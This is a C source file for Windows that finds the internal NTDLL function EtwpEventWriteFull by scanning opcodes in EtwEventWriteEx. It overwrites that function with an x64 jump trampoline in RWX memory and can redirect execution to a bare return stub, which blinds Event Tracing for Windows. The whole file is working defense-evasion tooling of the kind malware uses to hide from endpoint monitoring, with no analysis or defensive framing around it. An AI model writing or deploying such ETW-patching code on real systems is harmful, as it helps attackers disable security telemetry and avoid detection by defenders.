#include <stdio.h>
#include <stdint.h>
#include <Windows.h>

#include "functions.h"

#define TRAMPOLINE_SIZE 13
//#define DEBUG


BOOL GetEtwpEventWriteFull(OUT PVOID* ppFunction)
{
	// First getting a pointer to the EtwEventWriteEx function
	PBYTE pEtwEventWriteEx = GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "EtwEventWriteEx");
	if (pEtwEventWriteEx == NULL)
	{
#ifdef DEBUG
		printf("[-] Failed to get EtwEventWriteEx: %d\n", GetLastError());
#endif
		return FALSE;
	}
#ifdef DEBUG
	printf("[+] Found EtwEventWriteEx at 0x%p\n", pEtwEventWriteEx);
#endif

	PVOID	pTargetFunction = NULL,
			pTemp = NULL;
	int i = 0;

	// 1. We start at the pointers address and go down the memory lane to find the C3 instruction
	
	while(1)
	{
		BYTE opcode = pEtwEventWriteEx[i];

		// We have reached the RET instruction, stop there
		if (pEtwEventWriteEx[i] == 0xC3) 
		{
			// 2. Save the value into a temporary variable
			pTemp = pEtwEventWriteEx[i];
			break;
		}
		i++;
	}
	
	// 3. By doing it this way, we ensure we hit the right 0xE8 instruction which is the CALL instruction.

	// 4. We loop again, this time we move "upwards" to hit the CALL instruction
	while (i)
	{
		BYTE opcode = pEtwEventWriteEx[i];

		// 5. We have reached the CALL instruction
		if (opcode == 0xE8)
		{
			// We get the relative address for EtwpEventWriteEx. 
			// pEtwEventWriteEx + i -> this is the CALL instruction
			// + 1 gets you the first byte of the displacement
			// I used int32_t because its a 32-bit signed integer and negative displacements are handled correctly
			int32_t relative = *(int32_t*)(pEtwEventWriteEx + i + 1);
#ifdef DEBUG
			printf("[DBG] relative addr: 0x%p\n", relative);
#endif
			// We go from pEtwEventWriteEx + i which is the CALL instruction. +5 gets you past that and + relative gets you the relative address of EtwpEventWriteFull.
			pTargetFunction = pEtwEventWriteEx + i + 5 + relative;
#ifdef DEBUG
			printf("[DBG] pTargetFunction at position: 0x%p\n", pTargetFunction);
#endif
			// 6. pTargetFunction is now EtwpEventWriteFull
			*ppFunction = pTargetFunction;
			return TRUE;
		}

		i--;
	}
	
	return FALSE;

}


// Function defining the trampoline. With this we can alter the execution flow
BOOL TrampolineX64(IN PVOID pHookedFunction, IN PVOID pDetourFunction, OUT PVOID* pOriginalFunc, OUT DWORD* dwOldProt)
{
	DWORD dwOldProtect = 0;

	// Trampoline x64
	uint8_t	uTrampoline[] = {
			0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, pFunctionToRun
			0x41, 0xFF, 0xE2                                            // jmp r10
	};

	// The actual patch 
	uint64_t patch = (uint64_t)(pDetourFunction);

	// Prepare the jump point
	memcpy(&uTrampoline[2], &patch, sizeof(patch));

	// Saving the old function
	PVOID pTmp = VirtualAlloc(NULL, TRAMPOLINE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pTmp == NULL)
	{
#ifdef DEBUG
		printf("[DBG] VirtualAlloc failed for pTmp: %d\n", GetLastError());
#endif
		return FALSE;
	}
	memcpy(pTmp, pHookedFunction, TRAMPOLINE_SIZE);
	*pOriginalFunc = pTmp;


	// Changing memory permissions for the function you want to hook
	if (!VirtualProtect(pHookedFunction, TRAMPOLINE_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect))
	{
#ifdef DEBUG
		printf("[DBG] Failed to change memory protection: %d\n", GetLastError());
#endif
	}
#ifdef DEBUG
	printf("[DBG] Value of dwOldProtect in hook.c is: %d\n", dwOldProtect);
#endif

	// Copying the trampoline inside the hooked function now
	memcpy(pHookedFunction, uTrampoline, TRAMPOLINE_SIZE);
#ifdef DEBUG
	printf("[DBG] Trampoline set!\n");
#endif

	// Assigning values
	*dwOldProt = dwOldProtect;

	return TRUE;

}

// Unooking function which restores the original function
BOOL RemoveTrampoline(IN PVOID pHookedFunc, IN PVOID pOriginalFunction, IN DWORD dwOldProtect)
{

	DWORD	dwNewProtect = 0,
			dwOldProtection = 0;

	// Setting the original function
	memcpy(pHookedFunc, pOriginalFunction, TRAMPOLINE_SIZE);

	// Restoring the old protetion values
	if (!VirtualProtect(pHookedFunc, TRAMPOLINE_SIZE, dwOldProtect, &dwNewProtect))
	{
#ifdef DEBUG
		printf("[DBG] Failed to change memory protection: %d\n", GetLastError());
#endif
		return FALSE;
	}

	return TRUE;

}

// Function to just RET when a hooked function is called
VOID BlockExecutionFlow(PCONTEXT pCtx)
{
	// Altering execution flow by placing the instruction pointer to the RetStub
	pCtx->Rip = (ULONG_PTR)&RetStub;
}

